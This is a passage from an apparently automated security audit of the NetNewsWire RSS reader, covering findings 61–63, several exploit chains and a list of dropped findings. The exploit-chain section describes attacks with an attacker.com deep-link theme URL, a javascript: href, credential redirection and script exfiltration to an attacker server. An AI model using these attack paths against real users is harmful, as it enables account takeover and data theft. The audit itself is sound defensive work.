- The Feedbin scenario from the scanner is wrong (non-CloudKit callers have no limit)
- The CloudKit path is real but requires an error condition + concurrent `cloudKitDidModify` call in the stranding window
- Impact is sync-state integrity corruption, not credential theft or code execution

### 61. [LOW] Content-blocking rules silently skipped during async compilation window
**Class:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
**CWE:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition) - https://cwe.mitre.org/data/definitions/362.html
**File:** `Shared/Article Rendering/WebViewConfiguration.swift:39-48`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
compileContentBlockingRules() (line 51) is an async function that awaits WKContentRuleListStore.compileContentRuleList (line 69) before assigning the result to the static contentBlockingRuleList property (line 72). The call site is documented as 'early at app startup'. addContentBlockingRules(to:) (line 39) gates on 'guard let contentBlockingRuleList' (line 40); if compilation has not yet finished it silently returns without adding any rules and without scheduling a retry. If the callers in DetailWebViewController / iOS WebViewController invoke addContentBlockingRules before compilation finishes and then immediately load untrusted article HTML, that WKWebView will have zero content blocking for its entire lifetime — the next call to addContentBlockingRules for that same controller will also be a no-op because the weak-object hash-table 'configuredContentControllers' was never populated for it (the early-return guard at line 41 fires before the controller is ever recorded at line 46). Compilation of a non-trivial rule list from disk can take hundreds of milliseconds on slower devices, making the window realistic.

#### Impact
During the narrow window between app launch and the completion of async content-rule compilation, any article opened by the user loads in a WKWebView with no content blocking applied. Tracker URLs embedded in malicious RSS feed content that would otherwise be blocked by the rule list can make outbound connections, leaking the user's IP address and reading activity to the feed author.

#### Exploit scenario
A malicious RSS feed author embeds tracking pixel URLs (e.g. https://tracker.example/pixel.png) that are listed in ContentRules.json. The user launches NetNewsWire on a slower device, and the feed is pre-cached so the timeline populates before compileContentBlockingRules() resolves. addContentBlockingRules is called while contentBlockingRuleList is still nil, the guard exits, and the article is loaded. The tracker URL fires outbound, revealing the user's IP and read timestamp to the feed author — information that would have been suppressed had the rules been applied.

#### Preconditions
- User opens an article during the brief async compilation window at app launch (realistic on slower devices or large rule sets)
- The RSS feed being read must contain URLs that would be blocked by the compiled content rules
- The feed author controls at least one of those URLs to observe the outbound request

```
static func addContentBlockingRules(to webView: WKWebView) {
    guard let contentBlockingRuleList else {
        return   // ← silently skips; no retry; controller never tracked
    }
    let contentController = webView.configuration.userContentController
    if !configuredContentControllers.contains(contentController) {
        contentController.add(contentBlockingRuleList)
        configuredContentControllers.add(contentController)
    }
}
```

#### How to fix
addContentBlockingRules must not silently succeed when compilation is still in progress. One approach: if contentBlockingRuleList is nil, store the webView in a pending set and, at the end of compileContentBlockingRules (after line 72), iterate the pending set to apply the newly compiled rules. Alternatively, delay article loading until after compileContentBlockingRules() has resolved, rather than relying on a fire-and-forget async task at startup. At minimum add a comment that the early-return path causes permanent rule omission for that web-view instance.

**Exploitability:** Content-blocking rules compilation is async; a WKWebView created before compilation finishes silently receives no rules and is never retried for that controller. During the compile window (potentially hundreds of ms on first launch) the view has zero content blocking. CVSS 3.1 (AV:N/AC:H/C:L). Short-lived race; practically significant only during initial app launch.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — The race window is real and confirmed in code; first article load during async compilation can fire tracker domains without blocking. Scanner's "entire lifetime" claim is wrong (subsequent loads correctly apply rules), but the core race is genuine.

I now have enough evidence to render a complete verdict.

---

**Analysis**

**A. What the code actually does (lines 39–48)**

`addContentBlockingRules(to:)` is a `@MainActor` static function with a simple structure:

1. Guard on `contentBlockingRuleList` (a static optional) — if nil, return immediately and **do not** record the controller in `configuredContentControllers`.
2. If non-nil: add rules to the controller only if it hasn't been tracked yet.

`compileContentBlockingRules()` is an `async` function that awaits `WKContentRuleListStore.compileContentRuleList(...)` before setting `contentBlockingRuleList`. Both delegates call it inside `Task { await ... }` — unstructured, fire-and-forget — immediately in `applicationDidFinishLaunching` / `application(_:didFinishLaunchingWithOptions:)`.

**B. Call chain to external entry point**

- `compileContentBlockingRules()` ← `Task { await ... }` in both `AppDelegate.applicationDidFinishLaunching` (Mac, line 168) and `AppDelegate.application(_:didFinishLaunchingWithOptions:)` (iOS, line 67).
- `addContentBlockingRules(to:)` ← `DetailWebViewController.swift:319` and `iOS/Article/WebViewController.swift:647` — called immediately before `webView.loadHTMLString(...)` for every article render.
- Article content flows from network (RSS/Atom feeds, Feedbin, NewsBlur, etc.) — **external, unauthenticated source**.

The race window is confirmed: `compileContentBlockingRules` is an async task that can take hundreds of ms; article rendering can happen immediately if feeds are pre-cached and the user taps an article.

**C. Attempting to kill the finding**

**Can the compiler complete before the first article load?** Only on warm cache with a fast device. On cold launch or slow devices, the `WKContentRuleListStore.compileContentRuleList` round-trip (which hits a persistent store) realistically takes 100–600 ms, overlapping with the timeline populating.

**Does the `userContentController` computed property help?** No — it also checks `if let contentBlockingRuleList` and skips adding rules if nil (lines 106–108). So even the initial configuration is rule-free if called before compilation.

**Is there a retry/notification mechanism?** No. There is no `NotificationCenter` post, no observer pattern, and no `DispatchQueue.main.async` retry once compilation completes. The result is simply stored in `contentBlockingRuleList`.

**D. Probing the scanner's "entire lifetime" claim — this is WRONG**

The scanner states: *"the next call to addContentBlockingRules for that same controller will also be a no-op."* This is incorrect and reverses the logic.

When the early-return guard fires (line 40–41), the controller is **never recorded** in `configuredContentControllers`. On the *next* call to `addContentBlockingRules` for the same webView (when compilation has now finished):
- `contentBlockingRuleList` is non-nil ✓ — guard passes
- `configuredContentControllers.contains(contentController)` returns **false** (never tracked) ✓ — rules are added on this call

So subsequent article loads DO get content blocking applied correctly. The vulnerability is scoped to **only the first article load during the compilation window**, not the entire webView lifetime. The scanner significantly overstates the impact.

**Real impact**

- Only the first article rendered in the compilation window (hundreds of ms at startup) loads without tracker blocking.
- Attacker must control a tracker URL that appears in the user's feed AND is in `ContentRules.json`'s blocklist.
- Information leaked: user's IP address and read timestamp — genuine privacy exposure, not a traditional security boundary breach.
- `NSAllowsArbitraryLoads:true` (confirmed in architecture notes) means all HTTP traffic already flows — the content blocking rules are the *only* tracker mitigation layer, making the gap meaningful for privacy.

---

### 62. [LOW] Unchecked string index advance crashes on short CloudKit record names
**Class:** CWE-20: Improper Input Validation
**CWE:** CWE-20: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
**File:** `Modules/Account/Sources/Account/CloudKit/CloudKitArticlesZoneDelegate.swift:117-119`
**CVSS 3.1:** **2.7** (Low) — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *PR:H - high-privilege auth required*
**Confidence:** 0.72 (1 run agreed)

#### Description
The `stripPrefix` function at line 117–119 unconditionally calls `externalID.index(externalID.startIndex, offsetBy: 2)` without first verifying that the string is at least 2 code-units long. In Swift, advancing a String.Index beyond the endIndex via `index(_:offsetBy:)` traps with a fatal precondition failure at runtime.

Data flow:
1. CloudKit calls `cloudKitDidModify(changed:deleted:)` (line 51) with change/deletion records from the private CloudKit zone.
2. In `delete(recordKeys:pendingStarredStatusArticleIDs:)` (line 69), every record key whose type matches `CloudKitArticleStatus.recordType` has its `externalID` (the CloudKit record name) fed to `stripPrefix` at line 71.
3. In `update(records:...)` (line 82), every changed CKRecord's `externalID` is fed to `stripPrefix` at lines 84–87.
4. If any record name is 0 or 1 character long, the `index(offsetBy: 2)` call traps.

The app itself always creates record names with the 2-char prefix 'a|' or 's|' (minimum 2 chars), so normal operation is safe. However, CloudKit record names are server-side identifiers: a record created via the CloudKit dashboard, a third-party iCloud-connected app sharing the container, or a future regression in record-ID generation on another device would produce a record the current sync consumer cannot process without crashing.

#### Impact
Any CloudKit ArticleStatus or Article record whose record name is shorter than 2 characters causes a Swift preconditionFailure (fatal crash), terminating the app. Because the crash is triggered every time the sync engine processes that record, the app enters a crash-loop on the affected device until the offending record is removed. Only the local user is affected, but availability is lost.

#### Exploit scenario
An attacker who gains access to the user's iCloud account (or another device already signed in to that account and running a patched version of NetNewsWire) creates a CloudKit ArticleStatus record with the record name 'x' (1 character) in the Articles zone. When the victim's device processes the next CloudKit fetch-changes batch, `cloudKitDidModify` receives this record, calls `stripPrefix('x')`, and the Swift runtime immediately terminates the process with a fatal error. Every subsequent app launch triggers the same sync cycle and the same crash, effectively bricking the iCloud-sync account until the malformed record is manually removed via the CloudKit dashboard.

#### Preconditions
- Attacker must be able to write to the victim's private CloudKit zone — requires the victim's iCloud credentials or access to another signed-in device
- A CloudKit record with a record name shorter than 2 characters must exist in the Articles zone and be delivered to the victim device via a fetch-changes notification

```
func stripPrefix(_ externalID: String) -> String {
    return String(externalID[externalID.index(externalID.startIndex, offsetBy: 2)..<externalID.endIndex])
}
```

#### How to fix
Add a minimum-length guard before advancing the index in `stripPrefix`, and additionally validate that the expected prefix character ('s' or 'a') is actually present before stripping:

```swift
func stripPrefix(_ externalID: String) -> String {
    guard externalID.count > 2 else {
        assertionFailure("CloudKit record name too short to strip prefix: \(externalID)")
        return externalID
    }
    return String(externalID[externalID.index(externalID.startIndex, offsetBy: 2)...])
}
```
This converts an unchecked fatal trap into a recoverable path (the malformed record is skipped rather than crashing the process).

**Exploitability:** CloudKitArticlesZoneDelegate.stripPrefix unconditionally advances String.Index by 2 without a bounds check. A CloudKit record name shorter than 2 characters causes a fatal precondition failure. CVSS 2.7 (AV:N/AC:L/PR:H/A:L). PR:H reflects that triggering requires CloudKit admin access or a separate bug in record-ID generation.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — crash is confirmed and the CloudKit callback is a real external entry point, but exploitation requires prior compromise of the victim's iCloud account (PR:H); impact is persistent sync DoS only

I now have all the information needed. Let me assemble the complete picture:

**A. Code confirmation (lines 117–118):**
The `stripPrefix` function is exactly as the scanner described — an unconditional `index(offsetBy: 2)` with no length guard. In Swift, this traps fatally when called on a string of 0 or 1 characters.

**B. Call chain — verified:**
- `cloudKitDidModify(changed:deleted:)` (line 51) is the CloudKit framework callback — a genuine external entry point receiving server-pushed data.
- It immediately calls `delete(recordKeys:...)` (line 69) and `update(records:...)` (line 82).
- Both functions call `stripPrefix($0.externalID)` on every matching record's CloudKit record name with no length check.

**C. Normal-operation defence:**
The app's own record-creation functions (`statusID` → `"s|\(id)"`, `articleID` → `"a|\(id)"`) produce names with at least a 2-character prefix. Even the edge case `id = ""` yields `"s|"` (length 2), for which `offsetBy: 2` lands exactly at `endIndex` — safe. So under normal operation, no crash.

**D. Exploit precondition — the decisive gate:**
To deliver a record with a name shorter than 2 characters, an attacker must write to the victim's **private** CloudKit zone. Apple's private CloudKit database (`CKDatabase.privateCloudDatabase`) is fenced to the authenticated iCloud account owner — it is not accessible to arbitrary network attackers. The only realistic vectors are:
1. Compromise of the victim's Apple ID credentials (iCloud password + 2FA), or
2. Another device already signed in to the same iCloud account running a deliberately crafted/patched version of NetNewsWire.

Both scenarios represent **iCloud account compromise** (PR:H) — the attacker already has substantial access to all of the user's iCloud data. The incremental harm from triggering this crash (persistent sync-DoS) is real but very low relative to what iCloud credentials already enable. There is no path from a zero-privilege network attacker to this sink.

**Verdict reasoning:**
The bug is a genuine crash (not theoretical — Swift's runtime does fatal-trap on out-of-bounds `index` advance), and the entry point is a real external data source. But reaching a string shorter than 2 characters requires writing to a private CloudKit zone, which is gated behind iCloud credential access. This meets TRUE_POSITIVE on code correctness, but at PR:H makes the real-world exploitability very restricted.

### 63. [LOW] Quadratic feed-filter complexity from server-controlled response
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/NewsBlur/Sources/NewsBlur/Models/NewsBlurFeed.swift:64-86`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
In `NewsBlurFeedsResponse.init(from:)`, every folder's feed-ID list is appended into a flat `[Int]` array called `visibleFeedIDs` with no upper-bound guard (line 75). After iterating all folders, the final filter on line 86 calls `visibleFeedIDs.contains($0.feedID)` — an O(n) linear scan — for every parsed feed. Total complexity is O(folders × feedsPerFolder × totalFeeds). With the server supplying, say, 1 000 folders each listing 1 000 feed IDs and 5 000 feed entries, `visibleFeedIDs` grows to 1 000 000 elements and the filter performs 5 000 000 000 integer comparisons in a tight loop on the main account-refresh path. No size limits, pagination caps, or Set-based deduplication exist between the JSON decoder and this hot path.

#### Impact
A malicious or compromised NewsBlur API server can craft a single JSON response that causes O(N×M) CPU and unbounded heap allocation on the end-user device, freezing or crashing NetNewsWire. The workload is proportional to (total folder count × total feed IDs) × number of feeds, all of which are fully controlled by the server.

#### Exploit scenario
A malicious or MitM-intercepted NewsBlur server returns a `reader/feeds` response containing 2 000 `flat_folders` keys each with an array of 2 000 integer IDs (total 4 000 000 elements in `visibleFeedIDs`) plus 10 000 feed objects. The app calls the refresh path, enters the filter loop, and performs 40 000 000 000 integer comparisons, exhausting the CPU for tens of seconds to minutes and inflating heap by hundreds of megabytes, crashing the app or draining the battery of the user's device.

#### Preconditions
- User has a NewsBlur account configured in NetNewsWire.
- Attacker controls the NewsBlur API endpoint (malicious server, BGP hijack, or MitM of an HTTP/non-pinned TLS session).

```
var visibleFeedIDs: [Int] = []
// ...
for key in folderContainer.allKeys {
    let feedIDs = try folderContainer.decode([Int].self, forKey: key)
    let folder = Folder(name: key.stringValue, feedIDs: feedIDs)
    folders.append(folder)
    visibleFeedIDs.append(contentsOf: feedIDs)   // unbounded growth
}
// ...
self.feeds = feeds.filter { visibleFeedIDs.contains($0.feedID) }  // O(n) scan per feed
```

#### How to fix
Replace `visibleFeedIDs: [Int]` with a `Set<Int>` so that `contains` is O(1) instead of O(n), reducing total complexity to O(folders × feedsPerFolder + feeds). Additionally enforce a sanity cap (e.g., ≤ 10 000) on the number of folder keys and feed IDs decoded before returning an error, preventing unbounded allocation regardless of the lookup strategy. Both changes belong in `NewsBlurFeed.swift` around lines 64–86.

**Exploitability:** NewsBlurFeedsResponse builds a flat visibleFeedIDs array from all folder-feed mappings and filters with O(n) contains per feed, yielding O(F×M×N) total complexity. A malicious NewsBlur server with many folders/feeds can cause CPU exhaustion during refresh. CVSS 3.1 (AV:N/AC:H/PR:L/A:L). Requires attacker-controlled or compromised NewsBlur server.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — quadratic filter over server-controlled array confirmed; no bounds checks or Set-based deduplication; exploit requires MitM of HTTPS (AC:H) since baseURL is hardcoded

I have verified all relevant code. Here is my analysis:

---

**Analysis**

**A. Code confirmed at cited location**
Lines 64–86 exactly match the scanner's description:
- `var visibleFeedIDs: [Int] = []` — a **slice-backed array**, not a `Set`
- `visibleFeedIDs.append(contentsOf: feedIDs)` — unbounded growth (line 75)
- `self.feeds = feeds.filter { visibleFeedIDs.contains($0.feedID) }` — O(n) linear scan for every feed (line 86)

The algorithmic complexity claim is accurate: O(folders × feedsPerFolder × totalFeeds).

**B. Call chain to external entry point**
1. `NewsBlurFeedsResponse.init(from:)` — the Decodable initialiser (the vulnerable code)
2. → `session.send(request:resultType:)` in `NewsBlurAPICaller+Internal.swift:95` — URLSession network call
3. → `retrieveFeeds()` in `NewsBlurAPICaller.swift:84` — fetches `https://www.newsblur.com/reader/feeds`
4. → `refreshFeeds(for:)` in `NewsBlurAccountDelegate+Internal.swift:28` — **marked `@MainActor`**, so the hot filter loop runs on the main thread

The `baseURL` is **hardcoded** to `https://www.newsblur.com/` — no user-configurable server URL. An attacker cannot point the client at an arbitrary server.

**C. Attempting to kill the finding**

| Defence | Present? |
|---|---|
| Response body size cap | ❌ None |
| Folder/feed count limit | ❌ None |
| `Set<Int>` for O(1) lookups | ❌ `[Int]` used instead |
| TLS certificate pinning | ❌ Not found |
| Any validation between decoder and filter | ❌ None |

No defence closes the path. However: because `baseURL` is hardcoded and uses HTTPS, the attacker **must** either compromise the `newsblur.com` server itself or perform a MitM attack on a TLS session (requires a CA-trusted certificate forgery, BGP hijack, or similar high-effort capability). This pushes `AC` to `H`.

**D. Impact**
The `@MainActor` execution context means the quadratic filter loop fully occupies the main thread. A response with ~10,000 entries across thousands of folders would stall the UI for seconds; a sufficiently adversarial payload would trigger the iOS/macOS watchdog and kill the app. Pure availability impact; no data disclosure or code execution.

---

**Summary:** The vulnerability is real and confirmed. The data flows from a network response with no size guards through an O(n²) algorithm on the main thread. Exploitation requires MitM of an HTTPS connection (or server compromise), making `AC:H` appropriate.

## Exploit Chains

### [CRITICAL] Supply-Chain Build Pipeline → Developer Machine RCE → Production Binary Backdoor
**Path:** #1 Unsandboxed eval of .gyb template code enables CI/CD RCE → #2 Shared Xcode pre-build script enables supply-chain command injection → #32 CI actions pinned to mutable version tags, not commit SHAs

Finding 32 is the primary vector: gyb.py reads .gyb template files and passes extracted code blocks to Python's compile() then eval() with no sandbox and full builtins access, giving any .gyb template change unrestricted OS-level code execution on the developer's machine at build time. Finding 22 provides a parallel path via version-controlled Xcscheme PreActions: any commit that modifies the scriptText XML attribute in xcshareddata/xcschemes executes arbitrary shell commands without an Xcode approval prompt before the compiler runs. Finding 47 extends the attack surface to CI: actions/checkout@v5 and actions/upload-artifact@v4 are mutable floating tags; the tag owner (or an attacker who compromises those repos) can silently retarget them to execute malicious code on the CI runner, which on push-to-main runs has access to all repository secrets. Any one of these three paths allows an attacker to backdoor the production binary before code signing, exfiltrate developer credentials, or pivot to the infrastructure. No design control in scope blocks any of these paths.

### [HIGH] Web Page Click → Deep Link → Zip-Slip → Persistent WKWebView JavaScript Injection
**Path:** #8 Unvalidated arbitrary URL fetched via netnewswire theme deep link → #30 No cryptographic verification allows JS injection via malicious theme → #13 Unescaped feed article body rendered as raw HTML enables XSS  
**Blocked by:** App sandbox limits writes to the container — no cross-process OS escape confirmed from WKWebView context

Step 1 (finding 0): An attacker embeds a hyperlink such as netnewswire://theme/add?url=https://attacker.com/evil.nnwtheme on any web page. A single user click triggers the iOS URL scheme handler in SceneDelegate, which fetches the attacker-controlled URL via URLSession with no host-allowlist, scheme check, or redirect limit, then passes the downloaded file to ArticleThemeDownloader.handleFile for zip extraction. No path-traversal guard exists on the extraction, enabling zip-slip writes to any path within the sandbox container the app can write to. Step 2 (finding 51): Because ArticleThemesManager.importTheme performs no cryptographic signature check, hash verification, or HTML tag allowlist on the archive contents, any template.html with embedded script tags or inline event handlers is copied verbatim into the Themes directory. Step 3 (finding 30/31): Every subsequent article render loads the installed template, executing attacker JavaScript in the WKWebView context. That JavaScript can call all registered window.webkit.messageHandlers.* endpoints, read every rendered article's full HTML, and exfiltrate data to an attacker-controlled server. The injected theme persists across app restarts until manually removed. The macOS variant (finding 13) shares this entire chain and additionally allows file:// scheme in the download URL, enabling local file content to be passed into the theme processor.

### [HIGH] ATS Globally Disabled + HTTP Service Endpoints → Cleartext Credential Interception
**Path:** #24 NSAllowsArbitraryLoads Globally Disables ATS on iOS and macOS → #23 FreshRSS API URL accepts HTTP, transmitting credentials in cleartext  
**Blocked by:** HTTPS enforced server-side by most services (Feedbin, Feedly); only explicitly http:// endpoints are fully exposed

Finding 2 removes all client-side TLS enforcement via NSAllowsArbitraryLoads:true in both platform Info.plist files, meaning every URLSession in the app will follow http:// URLs without error or upgrade. Finding 43 allows users to configure FreshRSS with a user-supplied http:// endpoint; after configuration every sync request — including the initial username/password submission and all subsequent session tokens — travels in cleartext for the lifetime of the account. An adjacent-network attacker (public WiFi, corporate MITM proxy) passively captures these credentials with zero cryptographic work. The analogous NewsBlur path (T1 in the threat model) works identically: with ATS disabled and no client-side HTTPS enforcement, NewsBlur credentials sent as an HTTP form-body POST are fully readable on the wire. The combination of finding 2 with any cleartext service endpoint constitutes a complete, low-precondition credential-theft chain requiring only network adjacency.

### [HIGH] Feedbin API Server Compromise → Malicious Link Header → Credentials to Attacker Server
**Path:** #7 Feedbin credentials forwarded to server-supplied pagination URL → #24 NSAllowsArbitraryLoads Globally Disables ATS on iOS and macOS  
**Blocked by:** Feedbin API enforces HTTPS server-side; AC:H reflects MITM or server-compromise prerequisite

Finding 41: FeedbinAPICaller.retrieveEntries(page:) reads the pagination URL from the server-supplied Link response header, constructs a URLRequest to that arbitrary URL, and attaches the full Authorization:Basic header containing the Feedbin username and password, with no check that the resulting host matches api.feedbin.com. Finding 2 (ATS disabled) removes the client's only defense against http:// pagination URLs: if Feedbin's API returns an http:// Link header (due to misconfiguration, CDN compromise, or server-side attack), the credential-bearing request travels in cleartext to whatever host the attacker specifies. An attacker who achieves on-path MITM of the Feedbin API connection, or who compromises Feedbin's API server to return crafted Link headers, can redirect the Basic-auth header to any controlled host and receive the user's plaintext Feedbin credentials. This yields full Feedbin account takeover.

### [MEDIUM] RSS/JSON Non-HTTP URIs Stored → javascript: href in Templates → Navigation Policy Bypass → WKWebView XSS
**Path:** #27 JSON Feed parser stores article and feed URLs without scheme validation → #28 RSSParser stores non-HTTP scheme URLs in article and feed links → #16 javascript: URI in href from untrusted feed data → #29 iOS WKWebView allows link-activated navigations to file://, data:, and custom scheme URIs  
**Blocked by:** Modern WebKit versions may block javascript: navigations at the engine level; decidePolicyFor outcome for javascript: scheme not confirmed from code snapshot

Findings 44 and 45: JSONFeedParser and RSSParser both store article link fields verbatim from untrusted feed data without scheme validation, allowing javascript: URIs to be persisted in the article database (AtomParser is immune via isValidURLString). Finding 25: All six bundled theme templates inject feed-supplied link fields directly into HTML href attributes without a scheme allow-list, rendering markup such as <a href='javascript:attackerCode()'>. Finding 6: The iOS WKWebView decidePolicyFor handler contains a catch-all else { decisionHandler(.allow) } that passes all navigations with non-http/https/mailto/tel schemes back to WebKit unblocked. If WebKit honors the javascript: navigation (behavior varies by version and context), the attacker's JavaScript executes in the same rendering context as all registered message handlers. The chain is pre-auth and requires only that the user clicks the article link, triggering execution with no additional user gesture.

### [MEDIUM] Feed Stored XSS (Multiple Entry Points) → WKWebView Script Message Bridge → Native Privileged Actions
**Path:** #10 Feed author names/emails injected unescaped into WKWebView HTML → #12 DOM-XSS via innerHTML of feed-controlled footnote content → #13 Unescaped feed article body rendered as raw HTML enables XSS → #15 Unsanitized Feed Markdown Rendered as Arbitrary HTML → #38 Attacker-Controlled Text Injected into Status Bar via WKScript Message  
**Blocked by:** WKWebView renderer-process isolation prevents direct native memory access; full scope of bridge handler capabilities not determinable from snapshot alone

Five independent XSS entry points all deliver attacker JavaScript into the same WKWebView execution context. Finding 3 (unescaped author names/emails in byline HTML) and finding 30 (raw [[body]] HTML in templates) are reachable by any feed operator; finding 23 (footnote innerHTML) executes on link click; finding 57 (Markdown CommonMark HTML pass-through) requires source:markdown namespace usage; all four require only that the user views the article. Finding 48 confirms a concrete bridge action accessible from this context: any script can call window.webkit.messageHandlers.mouseDidEnter.postMessage(arbitraryString) to display misleading text in the macOS status bar. The full scope of bridge handlers — whether any expose account operations, file I/O, or keychain access — is unknown from the snapshot; the worst-case impact is exfiltration of all rendered article content via fetch() to an attacker server. WKWebView renderer-process isolation prevents escalation to native OS code execution, bounding this chain below the deep-link chain in severity.


## Dropped Findings

- **[UNCONFIRMED]** `Modules/Account/Sources/Account/CloudKit/CloudKitAccountDelegate.swift:214` logic-flaw (catchall-02) — s4 confidence 0.58 < gate 0.60
- **[UNCONFIRMED]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/ArticlesTable.swift:745` injection (spec-crypto-04) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Mac/MainWindow/Detail/page.html:3` injection (spec-batch-etl-35) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Mac/WKPreferencesPrivate.h:11` logic-flaw (catchall-47) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Modules/ArticlesDatabase/Sources/ArticlesDatabase/Extensions/Article+Database.swift:133` logic-flaw (catchall-53) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Modules/ErrorLog/Sources/ErrorLog/ErrorLogDatabase.swift:51` other (catchall-55) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `Modules/ErrorLog/Sources/ErrorLog/ErrorLogTable.swift:38` injection (catchall-55) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSCore/Sources/RSCore/AppKit/Keyboard.swift:37` injection (catchall-60) — s4 confidence 0.58 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSDatabase/Sources/RSDatabaseObjC/FMDatabase+RSExtras.m:27` injection (catchall-62) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `Shared/Exporters/OPMLExporter.swift:30` injection (catchall-87) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Shared/Localizable.xcstrings:989` other (catchall-93) — s4 confidence 0.35 < gate 0.60
- **[UNCONFIRMED]** `Shared/UserNotifications/UserNotificationManager.swift:92` other (catchall-102) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Shared/Widget/WidgetDataDecoder.swift:13` logic-flaw (catchall-103) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Widget/NetNewsWire_iOS_WidgetExtension.entitlements:9` logic-flaw (catchall-114) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `Widget/Widget Views/UnreadWidget.swift:65` logic-flaw (catchall-118) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `iOS/Account/Account.storyboard:566` logic-flaw (catchall-133) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `iOS/SceneCoordinator.swift:609` logic-flaw (catchall-152) — s4 confidence 0.58 < gate 0.60
- **[UNCONFIRMED]** `xcconfig/NetNewsWire_iOSshareextension_target.xcconfig:4` injection (catchall-168) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `xcconfig/NetNewsWire_macapp_target.xcconfig:4` other (catchall-170) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `xcconfig/NetNewsWire_project.xcconfig:1` other (catchall-171) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `xcconfig/NetNewsWire_project_debug.xcconfig:15` logic-flaw (catchall-172) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `xcconfig/common/NetNewsWire_macapp_target_common.xcconfig:1` other (catchall-176) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Modules/NewsBlur/Sources/NewsBlur/URLRequest+NewsBlur.swift:36` injection (spec-crypto-06) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Mac/MainWindow/MainWindowController.swift:140` injection (spec-crypto-15) — s4 confidence 0.38 < gate 0.60
- **[UNCONFIRMED]** `Mac/WKPreferencesPrivate.h:11` other (spec-crypto-44) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `Modules/ErrorLog/Sources/ErrorLog/ErrorLogDatabase.swift:37` info-leak (spec-crypto-50) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSCore/Sources/RSCoreResources/AppKit/WebViewWindowController.swift:27` other (spec-crypto-56) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSDatabase/Sources/RSDatabaseObjC/FMDatabaseAdditions.m:91` injection (spec-crypto-57) — s4 confidence 0.42 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSParser/Sources/RSParser/Feeds/XML/RSSItem.swift:32` other (spec-crypto-58) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Themes/Appanoose.nnwtheme/Info.plist:10` other (spec-crypto-92) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `iOS/UIKit Extensions/SFSafariViewController+Extras.m:24` info-leak (spec-crypto-138) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Modules/Images/Sources/Images/DownloadFailureTable.swift:36` logic-flaw (spec-logic-bug-08) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSParser/Sources/RSParser/Utilities/DateParser.swift:307` logic-flaw (spec-logic-bug-58) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSTree/Sources/RSTree/Node.swift:127` logic-flaw (spec-logic-bug-59) — s4 confidence 0.58 < gate 0.60
- **[UNCONFIRMED]** `Modules/HTMLMetadata/Sources/HTMLMetadata/HTMLMetadataDownloader.swift:119` injection (spec-access-control-52) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `Modules/RSCore/Sources/RSCoreResources/AppKit/WebViewWindowController.swift:27` logic-flaw (spec-access-control-56) — s4 confidence 0.52 < gate 0.60
- **[UNCONFIRMED]** `Widget/Shared Views/ArticleItemView.swift:56` info-leak (spec-access-control-101) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `iOS/Add/AddFeedViewController.swift:36` logic-flaw (spec-access-control-118) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `iOS/Inspector/AccountInspectorViewController.swift:96` logic-flaw (spec-access-control-126) — s4 confidence 0.38 < gate 0.60
- **[UNCONFIRMED]** `iOS/SceneCoordinator.swift:444` logic-flaw (spec-access-control-134) — s4 confidence 0.55 < gate 0.60
